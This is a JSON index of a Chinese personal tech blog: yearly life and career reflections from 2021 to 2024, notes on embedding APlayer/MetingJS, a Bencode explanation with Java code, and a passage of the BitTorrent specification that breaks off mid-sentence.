[{"title":"2021年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2021%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"关于转专业2021年结束，也是转到这个奇奇怪怪的专业正好一年。光看课表，现在上的还是基础课，丝毫没有学到实际能用得上的东西。往后看，越看越像是计科和大数据的结合体（顺带一提，我们学校这专业挂了计科的名）。下学期十一门课，五天除了周三每天都是满课，估计不会再像这学期这么悠闲，还在这写什么总结了（也算不上总结，只能说随便写的纪录，人总会忘记不重要的事，对吧）。感觉自己每次做选择时都是那么随意，无论是高考填志愿，还是转专业，（原来想转软件工程来着），还是后来老师让我加实验室，还有选大创项目，都好随便。以至于现在也不知道自己在干嘛。算是选了自己想去的大方向，但小方向就不管了？不知道。\n关于学习学习嘛，除了正常上课。主要大学，大不了自学，还是给项目做的网站吧。从给到这个任务，放了一学期的羊之后，也终于在期中之后开始真正去做了，其实是因为项目中期答辩，项目组五个人，一个是商院拉过来凑数的，还有组长他负责做项目核心的系统，我负责网站，还有俩不知道干嘛。前两天算是把登陆注册写完了，我把前端的任务交给了另一个人，因为他报了蓝桥杯的web组，或许做得比我好呢，不是我不想做。还有两周期末了，考完试，寒假得把网站全做好了，毕竟下学期每天都满课，估计没啥时间做别的了，另外就是学算法，准备蓝桥杯的比赛了。其他的没什么了，一直学嘛，想学什么都试试呗，以后或许就没机会尝试了。\n其他其他就没什么了，大三暑假争取找个实习吧，考研就不是很想考了，毕竟日语忘的没啥了，而且没什么可以选择的，（或许吧，谁知道呢）希望以后能在这摸鱼吧。拜拜，2021，除了疫情其他都挺好的。\n2022回顾这篇是2022写总结后补的，补发的。毕竟那时候还没有博客。是写在摸鱼派的，所以时间上就写摸鱼派记录的时间吧。原文地址，有啥想评论的，可以在那发（包括其他）。\n回顾嘛，也没什么好回顾的。项目黄了，蓝桥杯也没多大成果。除了一直在学（也不知道学的咋样），其他的也没干成。引用摸鱼派的评论吧好好珍惜这段时光吧，还有一年半，毕竟：\n\n谁的青春不迷茫~\n\n","categories":["记录生活"],"tags":["年终总结"]},{"title":"2022年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2022%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"关于学习2022年结束，还有一年半大学生活就要结束了。感觉时间过的很快，特别快。\n上半年因为疫情是在加上的网课，大二下学期的课程是满的。如图：主要课程是计网，计组，数据库，离散，概率，算法，Linux和python。全是比较重要的课程，以至于上完课有很多很多作业。不过上半年还是做了挺多事情的。\n首先是在一月底买了腾讯云的服务器，买了三年（2025年1月29号到期，222块钱），以及8块钱一年的域名 rxyl.xyz。域名快到期了。是为了给大创项目做网站，当然，后来项目不出意外的黄了，服务器的钱也没有报销。不过服务器还是蛮好玩的，主要是有个公网ip，很方便。在上面搭过各种环境，运行过网站，rabbitmq，nginx等等，作为学习来用确实不错。也搭过qq机器人，minecraft服务器，效果不错。\n虽然这个项目黄了。但下半年又加了一个新的大创项目（希望不要再黄了）前端还是那个人！后端还是我！\n在三月多在github搭了现在用的博客，体验还算不错。当初搭的时候，一个人摸索了快一个星期，butterfly主题折腾了好久，最后还是换掉了（emmmm，或许是有意义的吧\n后面又折腾了一段时间qq机器人，用的nonebot框架（基于python的），而我的python又不是很好，所以只弄了些基础的功能。最后python作业交的也是这个，然而只得了84分。\n差点忘了暑假在干嘛，还好博客笔记都有记录。学了挺多，也忘得挺快。下半年大三，一开始准备学学算法，发现还是太高估自己了。最后也算是中途搁置了。后来去看了设计原则，是真的多。也只是草草地了解了下，想深入使用估计很难，得写过很多代码才可以吧。后来还加了一个音游的开发组，算是为爱发电，不过被前端嫌弃菜了。不过慢慢完善吧，后面也打算学学前端。看了去年的年终总结，还参加了蓝桥杯，是个最拉跨的省三。\n关于兼职下半年开学初，在学校打印店找了份兼职。10块一小时，明年再去就是12块一小时了。认识了蛮多有趣的人，都很热爱生活吧。偶尔一起打打球，为此我还买了个羽毛球拍。总共赚了1500左右，买了个850的屏幕，现在看起来买的是有点仓促了。\n明年上半年，只有两门课。会有大把的空闲时间，应该是给我们考研考公复习准备的。所以我打算去找个实习啥的，一周七天五天有空，应该可以找到吧。其次就是vue，把前端学学，没有ui的网站真是太丑陋了。\n其他今年也算是很魔幻的一年，因为疫情吧。今年很感谢墨夏姐姐，很高兴能在去年的年末认识他。也很高兴遇见打印店认识的朋友，算是我在大学里为数不多的社交了。\n没啥其他的了，再见，2022。以后争取每年都有总结。好像有点乱，不过无所谓了。\n","categories":["记录生活"],"tags":["年终总结"]},{"title":"2023，悲","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2023%EF%BC%8C%E6%82%B2/","content":"这次就不写标题了，反正也没想到有什么可以区分的。很多时候也大概是这样，本该就是混乱和无序的。\n先说一些高兴的事情吧，毕竟一年的时间，全是标题里的悲的话，那倒也不至于。至于为什么是悲，主要取决于我最近的状态。写完开心的事，再写这些吧。\n三四月的时候还在学校上课，那段时间在准备找实习，虽然后面所有的面试都寄了。也没有耐心学的下去新的东西，指微服务那块自己用，完全用不到的。只是帮朋友写点接口，还遇到三四个人想一晚上sql的问题，当时还写篇博客记录，现在回去看到那个最后完成的sql都有些想笑。大概往回看就是这样，可能这就是成长？（某些方面，比如sql？想笑的原因也不止是sql，还有那些接口。为了图方便，所有的逻辑都是直接写在controller里的。（这个现在看来也还好，至于原因，实习的时候，老开发（他们都叫他大师）也这么干，图省事，他甚至直接在那拼接sql，最然不会有sql注入的问题。另外就是用 magic-api 搭了个低代码的平台方便主程自己实现一些简单的接口，因为主程是c#开发，用 unity 的。\n三月份的时候，因为蓝易云的活动，写了篇博客。关于如何搭建 minecraft 服务器的。最后也如愿以偿得到了一年的香港云服务器，但我腾讯云的还没到期，所以到现在也是一直闲置。真是浪费啊我还想毕业了新电脑直接整服务器，cpu 是 epyc 电表倒转的那种。现在想想也是我真的有那个需求吗，2c2g的服务器都能闲置（4c4g倒是高强度使用）。大概想法就是 linux windows 同时跑，可以随时远程开发。这个等弄新电脑了再说。\n然后五月份左右，有三个月都没写博客。那段时间，好像在投简历面试什么的。学校的双选会，就那么几家，全部都挂了。到现在我都很不理解，可能表达能力不太行吧还阳了一次，在疫情的第三年。发烧发了一晚上，很难受了属于是。不过新冠也是真的猛，毒性减弱了那么多，还打了疫苗，还是整的我三十八九度。\n后面没记错的话，因为双选会全寄，只能去学校安排的实训。我这个专业合作的企业是中软国际，著名的外包大厂。然后，我就有时间写博客了。因为那里讲的东西都过于基础了（至少对我来说，spring，git之类的）。然后也没啥人听他讲，毕竟看得出来，他也不想讲，上班而已。上午讲讲，下午就不讲了，让自己动手试。所以考研的看课做题，找工作的刷面试题，然后就是打游戏看电影的。我也看了铃芽户缔，是真的很喜欢新海诚的电影了。之前还补看了他初期的作品，云之彼端。秒速五厘米也是看了两遍。（没人陪我看，自己看也挺好后面在找实习的时候，又开始从头看家庭教师杀手。看了七十多集，后来找到实习就没空看了。害作业什么的，也比较简单。我写后端，有个同班的写前端，我们班去实训的七八个人，也就我和他还有有点技术力了。其他人甚至连git都不会用，也就不指望能写代码了。作业很无奈是小组作业，3-4人那种，第一次我俩随便带了个写报告和ppt的。第二次他们知道后，就基本都找过来要一组，但代码基本就两个人写，害。最后一次作业，我和前端都已经出去实习了。所以就干脆就我俩，没带任何人。答辩的时候，老师甚至都没怎么看，而是问了我俩近况。他是去了上海，我记得他是想去杭州来着。他去实习就能直接接触代码，进行开发。属实是给我羡慕到了，我去实习前一个月是低代码平台，流程图那种。后面终于去了正经的大项目，不过作为边缘人，我只能写sql，碰不到一点代码。虽然他也跟我吐槽过，他那边的后端实习生。\n想起来，去实训之前还借了朋友的 switch，准备打完王国之泪的。结果玩了一周就再也没碰过了，虽然不可否认这是个优秀的游戏，但和单人的 minecraft 一样，让我感觉到孤独。可能更喜欢玩 GTA5 这种，像看一部电影，读一本书，不过更加有参与感。虽然支线都没怎么做，只打了主线。线上太卡，环境也有点差\n在悲之前，还有件乐的事。其实应该放在前面的。就是羽毛球。从买羽毛球拍，到跟在打印店兼职认识的朋友在学校体育馆打。最后怡佳姐带我们出去打，真的是非常快乐的一段时间了。后面四个人一起还去爬了苏州灵岩山，此处有图，我去找找。\n\n开心的事情，果然是有照片的。还有打印店新员工——汤姆\n\n说回羽毛球，和我一起实训的那个前端。是院羽毛球队的！强是真的强，实训几个月，基本每周都要去打一次。俩人骑个共享电动车，骑到汽车站旁边的羽毛球馆，20块钱不限时，一打打一下午。他甚至还和别人打熟了，偶尔碰到还会切磋。在我看来，属于是神仙打架了。我实在打不动了，让我给他发球，他练反手。绝了有次去的路上，我记得有问过他以后想干什么。他说他想开个羽毛球馆，每天打打羽毛球。平淡且朴实无华让我想起了和怡佳姐他们去的那个羽毛球馆，常熟市运动会羽毛球冠军开的。是个精瘦的大爷没见过他扣杀，但他控球是真的强。丁阳还去挑战了一番，不出意料地被打爆了。\n乐的事情基本就这些了。\n\n划条分割线，下面就是悲的事情了。\n悲的事情大背景大概就是人们期盼的疫情后的经济复苏并没有到来，美国还在加息周期，看上去好像快加到头了？反正与我国降息刺激经济相悖。加之出生率一直在下降，人口已经负增长了。但这几年的应届毕业生都破千万了，工作也是真难找，大学生失业率估计也很高，不然也不会那么多去考研考公的。\n九月底找到了实习，来到了南京。然后第一次租房，就花了十来分钟。属于是太草率了，不过也就那样，后面大概知道租房要注意哪些地方了实习的公司是挺大一公司，但转正也只能外包。本部的正式员工得硕士或者985和211然后工资也不高，加班极其严重。就我实习这三个多月，知道的离职的和有离职想法的正式员工都五六个了，实习生更不用说，我见到的已经走了三个了，还有俩现在值班，两班倒轮班，能坚持不走属实牛，毕竟实习也就两三千块钱。\n我现在属于两个项目的人（大部分人也是身兼数职，同时在两三个项目辗转，哪里缺人去哪里）。最开始接触的那个低代码的，另一个实习生走后，就剩我和项目经理俩人做。他经常出差，和客户沟通，估计也是身兼数职。就我一个人做开发，一个小需求三万。公司是会赚钱的项目经理挺好，我说另外一个项目忙不过来（七十多个报表，还有俩别的需求），去不了他那。他反正非让我去，这边项目的领导也没说啥然后就去了，干完走的时候我才意识到，我不去没人了。难怪非要喊我去，绝包括项目经理也跟我吐槽，说这几个月离职的人多，他要和领导要人来帮忙。\n然后说说另外那个大项目，由总公司产品线的开发人员驻场开发，大概十来人。然后我们分公司协助，等开发完，后面全是分公司来维护。然后，这项目给我的感觉就是，前期没有一点规划，边调研边做。客户今天提的需求，明天就可能改，还不止改一次。然后每天不是在解决问题，就是在敷衍客户。但驻场开发，客户就在边上，没有一点办法。领导是会敷衍的，至少我学不来一点客户那边的领导是真的能骂，不光骂我们这边，骂和我们对接的另外的乙方，还骂他们自己公司的别的部门。是真的猛，还是技术专家（职位吧，还是头衔。不太清楚每天都加班，基本都十点半才下班。我最晚的一次是凌晨三点，真不知道图啥那些主管有时候还通宵，割接和上线的时候。不过偶尔也会聚餐，买点夜宵。不过也就那样，虽然没有很浓的应酬的感觉，但感觉也没那么好。库库吃就完了我的饭搭子同事甚至还建了干饭人的群，每到饭点，摇人吃饭。另外就是羡慕甲方朝九晚五，食堂便宜好吃（虽然不让我们吃），还有篮球场、羽毛球馆。甚至还有人过生日会给我们分几块蛋糕。\n实习的同时，偶尔也写点毕设的代码。但是最近项目上线是一点写的时间都没有了。（悲\n最后就是，虽然每天都在写sql，但多少还是能学到点东西，虽然不是我想学的（指后端开发相关现在干的属于是数据开发干的事。IQ数据库是列式数据库，适合于批量数据处理和即时查询。然后被我干崩了两次，当然也不只是我。主管那几天隔三岔五在群里问这个sql谁写的，来认领下。我干崩的原因是报表查询没加默认条件，有人导出18亿数据导致cpu满载，数据库不可用。18亿啊，真是人才别人干崩的原因差不多都是sql没走索引，大数据量导致的全表扫描。客户那边那个技术专家没少因为这骂过人，大概是当初设计的不合理，别人才过的坑，我们还在踩之类的。不过都与我无关了，写sql罢了，不知道什么时候能写点我想写的代码。（sql要写吐了，现在写sql应该很熟练了。不会有之前那种join都忘了的事情发生了\n不知不觉已经三点钟了，不知道是不是加班搞的我作息都不太正常了。去年的总结也是半夜写的，记得是快一点的时候完成的。最后的最后，我真的需要继续这份实习吗？是入行的机会？还是悲剧的开始？\n","categories":["记录生活"],"tags":["年终总结"]},{"title":"2024年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2024%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"2024年过的平平淡淡，让我回忆一下，然后下面就是流水账时间…\n上半年上半年都在实习公司度过，因为去年年底项目才上线，年初也比较忙，没有什么记录，基本就是上班。不过因为忙，人手不够，所以也让我开始写Java了，不再是低代码平台和写写sql了。（不过，写CURD接口和写sql区别也不是特别大）\n三月份配了台新电脑，花了四千三。内存也是上到了64G，不过很少跑满，跑一半的情况都比较少。不过基本不用担心内存不够的问题了，minecraft几百个mod的大型整合包我也能边开服务器边开客户端玩。可惜的就是板U，买了Q1HY，工程测试的版本。便宜是真便宜，就是不稳定，频率高了会蓝屏。现在也基本默频在用，没有超频了。\n到五月份，重要的事情就是毕设答辩了。毕业设计这个东西的代码我从去年8月左右在实训的时候就开始写了。那时候很闲，处于慢慢写的状态，基本完成的差不多了。也庆幸那时候就开始了，不然按实习那个工作强度，再加上毕设的代码和论文。会过得非常痛苦。论文基本上第一遍就过了，后面按导师的意见改改格式，大体上的内容基本没有改动。然后就是五月回学校答辩，答辩其实很水，感觉还是ppt和讲为主。最后展示系统的时候，三个老师看一个教师大概三十人，分开看。其实基本也就扫一眼，十秒左右。总的来说，除了拿学位证之外，没有任何意义。（当然，也可以自己赋予意义。可惜的是，我赋予的意义最终也像大部分项目一样烂尾了。因为最初这个项目是为了给墨夏使用的。\n五月另一个重要的事就是拍毕业照了。和不太熟悉的同班同学聊聊近况，和熟悉的朋友聊聊未来打算。有人考上研，后面继续求学；有人考研失败，继续备考；有人和我一样找工作，问我怎么面试的；还有找到实习和我一样当牛马的。大家都有各自的人生轨迹，也有计划，但无一例外地我觉得大家都很迷茫，只是短暂地享受着最后一个月的大学生活。和室友不是一个专业，单独拍了一些照片（下面放个我在中间的宿舍合照吧）。\n\n最后说下舍友的情况吧，除了我他们都没有干计算机相关的工作。左一，家境不错，回昆山找了个工作。steam全是游戏，三年前只狼就七周末乱杀…是个富哥。左二，河南的小伙，在考公。第一次考就进了面，但面试被刷了，现在也依然在考公。很有梗，是个非常有趣的人。右一，健身快三年了，合照可以看出来练得非常好。现在继续健身，并且在做电商主播（直播、模特、卖货应该）。把爱好当饭吃，很有个性的人。还有一个不在的富哥，大二去澳大利亚留学了。另外两个朋友也大概说下吧，他们在我隔壁宿舍，和我舍友是一个专业，转专业后和我是一个专业。非常巧的是，我们三个宿舍连在一起。\n\n左一，考研失败了。在学校附近找了份实习，同时继续备考。是周教授的关门大弟子，实验室唯一的本科生，三年来都没新生加入。搞人工智能高手。右二，富哥，申请了美国的大学，现在也在美国待了很久了。是个心态上很摆的人，但事情做得很好。高考复读了一次，作文偏题吧。很牛逼的人。左二，我们计算机院的章院长，现在被调到生物院了好像。\n六月底，到毕业的时候了。又回了趟学校。回去就两件事\n\n拿毕业证和学位证\n和朋友们告别\n\n所有的一切都像走流程一样，没有太大的伤感氛围。和舍友最后聚了一次，后面估计很难再在一起了。（不过他们三个前几天倒是聚了一次\n下半年七月一号，我签了劳动合同，继续在这家公司干。还是牛马的生活。不过项目暂时没那么忙了，就是年底会非常地忙。（大概是总部的业绩要求没有达到吧\n七月底搬了次家，搬到现在住的地方。离公司更近了，但离地铁站更远了，为此买了辆山地车。（很烂的车，后悔了搬家是因为原来租的房子涨价了，当初租房也十分地草率。去年的年终里有提今年新租的房子是和同事整租的，他和他老婆原来住在她姐家，六楼的步梯房。因为他老婆怀孕不方便所以换房子。那周末找了个中介和他跑了一下午，看了好几间。有一间是很有矛盾的，很合适的房子，但是才装修一年，他老婆觉得有甲醛所以否决掉了。当时已经要放弃了，同时满足我们俩要求的房子实在是太少了。让中介找了最后一间，也就是这间基本满足了。搬家是真累，我真要吐槽六楼的步梯房。（他俩东西还多\n后面就正常上班，一直到十二月之前都不怎么忙。这段时间看了两本书，《收获，不止Oracle》和《Redis设计与实现》。还有两本本原来是在计划里的。一本是《收获，不止SQL优化》，看了大纲，和开发相关性不大，和DBA的相关性很大，所以就不准备读了。另一本是《Apache Kafka实战》，因为太忙了，暂时也搁置了。这本后面有空还是会读的，在计划中。期间也看了点《Haskell函数式编程入门（第2版）第1卷》，前面的概念太复杂了，而且语法也非常地抽象。可以说和现有的几乎所有编程语言都不一样。最终也是只搭了环境，草草地跟着书写了一点就结束了。\n后面打算自己写个项目，准备用p2p，整了很久也没整出来。研究 BitTorrent协议 和 内网穿透 研究了很久。后面应该会继续做吧最后就是前几天，给鱼排的聊天室节点用go实现了一个版本。经过站长阿达的高强度测试，最终也是上了北京的节点暂时运行一周看看情况。最开始五十多个客户端，阿达疯狂输管理员命令（管理员命令会广播两次，命令本身和系统回复）。会出现卡顿和明显地吞消息情况。再到后来为每个消息都用协程发送，虽然改善了吞消息，但是并发一大就会崩。最后改成为每个ws连接创建协程，终于是稳定了，250左右的连接测试时也非常流畅。（让阿达测上限，说上限是他的硬盘，250个连接电脑已经很卡了）测试过程中，阿达一直说原本的实现就不会这样随便造。真是太欠了。那是netty牛逼，我要是能纯手搓出netty这样的，我做梦都能笑醒。（阿达骂人表情包.jpg）还给我提了个限制流量的需求，真是难搞啊。\nEnd是非常想换工作的一年，也是面试全部失败的一年，也是我第一次不想写java的一年。想转go，不知前路如何。自己还是和前两年一样迷茫。\n","categories":["记录生活"],"tags":["年终总结"]},{"title":"APlayer和MetingJS的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/APlayer%E5%92%8CMetingJS%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"简介APlayer是一个可爱的HTML5音乐播放器。MetingJS给APlayer播放器加入网易云等支持。\nAPlayer项目地址MetingJS项目地址APlayer官方文档\n配置使用cdn调用在 head 里面插入：\n&lt;link href=&quot;https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;script src=&quot;https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js&quot;&gt;&lt;/script&gt;\n在 footer 里面插入：\n&lt;script src=&quot;https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js&quot;&gt;&lt;/script&gt;\n当然，也可以将原文件下载至本地进行调用。\n使用Aplayer原生用法例如：\n\n\n    const ap = new APlayer({\n        container: document.getElementById('aplayer_1'),\n        audio: [{\n            name: '长岛',\n            artist: '花粥',\n            url: 'https://cooooing.github.io/https://cooooing.github.io/images/APlayer和MetingJS的使用/长岛.mp3',\n            cover: 'https://cooooing.github.io/https://cooooing.github.io/images/APlayer和MetingJS的使用/长岛封面.png'\n        }]\n    });\n\n\n使用音乐播放器加载音乐，url可以是本地资源也可以是http链接。代码：\n&lt;div id=&quot;aplayer_1&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    const ap = new APlayer(&#123;        container: document.getElementById(&#x27;aplayer_1&#x27;),        audio: [&#123;            name: &#x27;长岛&#x27;,            artist: &#x27;花粥&#x27;,            url: &#x27;https://cooooing.github.io/https://cooooing.github.io/images/APlayer和MetingJS的使用/长岛.mp3&#x27;,            cover: &#x27;https://cooooing.github.io/https://cooooing.github.io/images/APlayer和MetingJS的使用/长岛封面.png&#x27;        &#125;]    &#125;);&lt;/script&gt;\n\n\n更多的用法，比如多个音乐组成的列表模式、节省空间的迷你模式等可以参考APlayer官方文档\n\n使用MetingJs载入网易云等其他音乐网站的音乐例如：\n代码：\n&lt;meting-js    server=&quot;netease&quot;    type=&quot;song&quot;    id=&quot;536622304&quot;&gt;&lt;/meting-js&gt;\n\n可以看出MetingJS的代码也更简洁。有三个必要参数：\n\nid 指定歌曲 ID &#x2F; 播放列表 ID &#x2F; 专辑 ID &#x2F; 搜索关键字\nserver 指定音乐平台： netease tencent kugou xiami baidu\ntype 指定调用类型：song playlist album search artist\n还有许多其他的参数可以参看MetingJS官方文档\n\n\n\n播放列表（type=&quot;playlist&quot;）：\n固定播放器（fixed=&quot;true&quot;），像页面左下角那个一样迷你播放器（mini=&quot;true&quot;）：\n更多的参数就不介绍了。\n总结之前使用butterfly主题时，主题内置了MetingJS。只需要在配置中改几个配置项，加一个div便可实现全盘吸底的APlayer。但是本文的方法是通用的，在主题中使用的话，需要找header、footer等文件，在其中修改。啊，我怎么又在改博客。\n","categories":["学习笔记"],"tags":["APlayer","MetingJS"]},{"title":"Bencode编码","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Bencode%E7%BC%96%E7%A0%81/","content":"BencodeBencode（发音为Bee-Encode）是 BitTorrent 用在传输数据结构的编码方式。\n这种编码方式支持四种资料类型：\n\n字符串\n整数\n串列\n字典表\n\nBencode 最常被用在 .torrent 档中，文件里的元数据都是被 Bencode 编码过的字典表。这种编码方法也被 Tracker 返回响应时使用。\n虽然比用纯二进制编码效率低，但 Bencode 结构简单而且不受字节存储顺序影响（所有数字以十进制编码），这对于跨平台性非常重要。并且，Bencode具有较好的灵活性，即使存在故障的字典键，只要将其忽略并更换新的就能兼容补充。\n编码方法Bencode 使用 ASCII 字符进行编码。\nBencode（BitTorrent 编码）是一种简单且轻量级的序列化格式，主要用于 BitTorrent 协议中的元数据文件（.torrent 文件）。Bencode支持四种基本类型：整数、字符串、列表和字典。下面是 Bencode 的详细介绍，包括其语法、数据类型和一些示例。\n\n整数\n语法：i&lt;数字&gt;e int 整数 end\n示例：i123e 表示整数 123\n\n负数和零也是有效的，例如 i-123e 表示 -123，i0e 表示 0，但是不可以使用 i-0e 包括其他除了i0e的具有前导0的（i03e）都是无效的。\n\n\n\n\n字符串\n语法：&lt;长度&gt;:&lt;字符串&gt;\n示例：4:spam 表示字符串 “spam”\n\n长度是指字符串的字节数，而不是字符数\n\n\n\n\n列表\n语法：l&lt;元素1&gt;&lt;元素2&gt;...e list 列表 end\n示例：l4:spam3:fooi42ee 表示列表 [&quot;spam&quot;, &quot;foo&quot;, 42]\n\n列表中的元素可以是任何 Bencode 支持的类型\n\n\n\n\n字典\n语法：d&lt;键1&gt;&lt;值1&gt;&lt;键2&gt;&lt;值2&gt;...e dictionary 字典 end\n示例：d3:bar4:spam3:fooi42ee 表示字典 &#123;&quot;bar&quot;: &quot;spam&quot;, &quot;foo&quot;: 42&#125;\n\n字典中的键必须是字符串，并且按键的字典序排序\n\n\n\n\n\n复杂结构的 Bencode 示例：包含嵌套结构的 Bencode\nd8:announce22:https://tracker.example.com/announce4:infod6:lengthi1000e4:name4:file15:piece lengthi262144e6:pieces20:0123456789abcdef0123456789abcdefe\n\n表示一个包含嵌套字典和列表的复杂结构，类似于以下 JSON：\n&#123;  &quot;announce&quot;: &quot;https://tracker.example.com/announce&quot;,  &quot;info&quot;: &#123;    &quot;length&quot;: 1000,    &quot;name&quot;: &quot;file&quot;,    &quot;piece length&quot;: 262144,    &quot;pieces&quot;: &quot;0123456789abcdef0123456789abcdef&quot;  &#125;&#125;\n\nBencode 编解码实现package com.example.kernel.util;import java.util.ArrayList;import java.util.LinkedHashMap;import java.util.List;import java.util.Map;public class BencodeUtils &#123;    // 编码方法    public static String encode(Object obj) &#123;        StringBuilder sb = new StringBuilder();        if (obj == null) &#123;            return &quot;&quot;;        &#125;        switch (obj) &#123;            case Map&lt;?, ?&gt; map -&gt; &#123;                sb.append(&quot;d&quot;);                for (Map.Entry&lt;?, ?&gt; entry : map.entrySet()) &#123;                    sb.append(encode(entry.getKey()));                    sb.append(encode(entry.getValue()));                &#125;                sb.append(&quot;e&quot;);            &#125;            case Integer ignored -&gt; sb.append(&quot;i&quot;).append(obj).append(&quot;e&quot;);            case List&lt;?&gt; list -&gt; &#123;                sb.append(&quot;l&quot;);                for (Object item : list) &#123;                    sb.append(encode(item));                &#125;                sb.append(&quot;e&quot;);            &#125;            case String str -&gt; sb.append(str.length()).append(&#x27;:&#x27;).append(str);            case null, default -&gt; throw new IllegalArgumentException(&quot;Unsupported type: &quot; + obj.getClass());        &#125;        return sb.toString();    &#125;    // 解码方法    public static Object decode(byte[] s) &#123;        Object o = null;        if (s == null || s.length == 0) &#123;            return o;        &#125;        o = decodeObject(s, 0)[0];        return o;    &#125;    // 辅助方法：解码对象    private static Object[] decodeObject(byte[] s, int index) &#123;        byte b = s[index];        if (b == &#x27;i&#x27;) &#123;            // 整数类型            index++;            int start = index;            while (s[index] != &#x27;e&#x27;) &#123;                index++;            &#125;            long value = Long.parseLong(new String(s, start, index - start));            index++;            return new Object[]&#123;value, index&#125;;        &#125; else if (&#x27;0&#x27; &lt;= b &amp;&amp; b &lt;= &#x27;9&#x27;) &#123;            // 字符串类型            int start = index;            while (s[index] != &#x27;:&#x27;) &#123;                index++;            &#125;            int length = Integer.parseInt(new String(s, start, index - start));            index++;            String str = new String(s, index, length);            index += length;            return new Object[]&#123;str, index&#125;;        &#125; else if (b == &#x27;d&#x27;) &#123;            // 字典类型            index++;            Map&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;();            while (s[index] != &#x27;e&#x27;) &#123;                Object[] keyResult = decodeObject(s, index);                String key = (String) keyResult[0];                index = (int) keyResult[1];                Object[] valueResult = decodeObject(s, index);                Object value = valueResult[0];                index = (int) valueResult[1];                map.put(key, value);            &#125;            index++;            return new Object[]&#123;map, index&#125;;        &#125; else if (b == &#x27;l&#x27;) &#123;            // 列表类型            index++;            List&lt;Object&gt; list = new ArrayList&lt;&gt;();            while (s[index] != &#x27;e&#x27;) &#123;                Object[] result = decodeObject(s, index);                list.add(result[0]);                index = (int) result[1];            &#125;            index++;            return new Object[]&#123;list, index&#125;;        &#125; else &#123;            // 忽略无效的字符            index++;            return decodeObject(s, index);        &#125;    &#125;&#125;\n\n","categories":["学习笔记"],"tags":["java","Bencode编码","BitTorrent","p2p"]},{"title":"BitTorrent协议","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/BitTorrent%E5%8D%8F%E8%AE%AE/","content":"BitTorrent协议规范BitTorrent是一个用于分发文件的协议。它通过URL识别内容，并设计为与网络无缝集成。与普通HTTP相比，它的优势在于，当多个用户同时下载同一文件时，下载者之间会互相上传，这使得文件源能够以适度的负载支持大量下载者。\nBitTorrent文件分发包括以下实体：\n\n普通Web服务器\n静态“元信息”文件\nBitTorrent跟踪器\n“原始”下载者\n终端用户的Web浏览器\n终端用户的下载器\n\n理想情况下，一个文件应该有多个终端用户。\n服务端准备步骤：\n启动一个跟踪器（或更可能是已经在运行一个）。\n启动一个普通的Web服务器，例如Apache，或已经有一个。\n将.torrent扩展名与MIME类型application&#x2F;x-bittorrent关联（或已经完成）。\n使用要服务的完整文件和跟踪器的URL生成一个元信息（.torrent）文件。\n将元信息文件放置在Web服务器上。\n从其他网页链接到元信息（.torrent）文件。\n启动一个已经拥有完整文件的下载器（“原点”）。\n\n用户下载步骤：\n安装BitTorrent（或已经完成）。\n浏览网页。\n点击.torrent文件的链接。\n选择在本地保存文件的位置，或选择恢复部分下载。\n等待下载完成。\n告诉下载器退出（在这之前，它会继续上传）。\n\nbencoding\n字符串以长度前缀表示，后跟一个冒号和字符串。例如，4:spam对应于“spam”。\n整数以“i”开头，后跟十进制数字，再以“e”结束。例如，i3e对应于3，i-3e对应于-3。整数没有大小限制。i-0e是无效的。以零开头的所有编码，例如i03e，都是无效的，除了i0e，它当然对应于0。\n列表以“l”开头，后跟其元素（也经过bencoding编码），最后以“e”结束。例如，l4:spam4:eggse对应于[‘spam’, ‘eggs’]。\n字典以“d”开头，后跟一个交替的键值对列表，最后以“e”结束。例如，d3:cow3:moo4:spam4:eggse对应于{‘cow’: ‘moo’, ‘spam’: ‘eggs’}，而d4:spaml1:a1:bee对应于{‘spam’: [‘a’, ‘b’]}。键必须是字符串并按排序顺序出现（按原始字符串排序，而非字母数字）。\n\n元信息文件元信息文件（也称为.torrent文件）是一个bencoded字典，包含以下键：\n\nannounce：跟踪器的URL。\ninfo：映射到一个字典，下面描述了其键。\n\n所有包含文本的.torrent文件中的字符串必须是UTF-8编码。\ninfo字典\nname：键映射到一个UTF-8编码的字符串，建议将文件（或目录）保存为的名称。这是纯粹的建议。\npiece length：映射到文件分割成的每个片段的字节数。为了传输，文件被分割成固定大小的片段，除非最后一个片段可能被截断，所有片段通常都是相同长度的。piece length几乎总是2的幂，最常见的是2^18 &#x3D; 256 K（BitTorrent在3.2版本之前使用2^20 &#x3D; 1 M作为默认值）。\npieces：映射到一个长度是20的倍数的字符串。它被细分为长度为20的字符串，每个字符串是相应索引的片段的SHA1哈希。\n\n还可以有一个length或files键，但不能同时存在。如果length存在，则下载表示单个文件；否则，它表示一组在目录结构的文件。在单文件情况下，length映射到文件的字节长度。\n在其他键的目的上，多文件情况被视为只有一个文件，通过按文件列表中出现的顺序连接文件。文件列表的值是files，映射到一个字典列表，包含以下键：\n\nlength：文件的字节长度。\npath：对应子目录名称的UTF-8编码字符串列表，最后一个是实际文件名（零长度列表是错误情况）。\n\n在单文件情况下，name键是文件名；在多文件情况下，它是目录名。\n跟踪器跟踪器的GET请求具有以下键：\n\ninfo_hash：bencoded形式的info值的20字节SHA1哈希。该值几乎肯定需要进行转义。请注意，这个值是元信息文件的一个子串。info-hash必须是编码形式的哈希，正如在.torrent文件中找到的那样，这与b解码元信息文件、提取info字典并编码相同，仅当bencode完全验证输入（例如，键排序、没有前导零）时才能这样做。相反，这意味着客户端必须拒绝无效的元信息文件，或者直接提取子串。它们不得在无效数据上进行解码